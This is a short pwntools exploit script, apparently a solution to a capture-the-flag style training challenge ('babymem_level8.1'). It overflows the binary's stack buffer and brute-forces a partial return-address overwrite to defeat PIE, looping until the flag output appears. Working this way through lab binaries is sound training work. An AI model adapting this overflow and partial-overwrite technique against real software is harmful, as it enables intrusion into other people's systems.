#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babymem_level8.1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./babymem_level8.1")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(**locals())

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

offset = None

offset = 103 + 2

if not offset:
    io = start()
    io.sendline("300")
    io.sendline(b"\0" + cyclic(300))
    io.wait()
    io.interactive()
    offset = cyclic_find(io.corefile.read(io.corefile.rsp, 4))


success(f"Found offset at {offset}")

while True:
    io = start()

    pay = b"\0" * offset + p16(0xD0D)
    io.send(str(len(pay)))

    io.send(pay)

    a = io.recvall()

    info(len(a))

    # print(a.decode())
    # io.interactive()
    if len(a) > 150:
        print(a)
        break
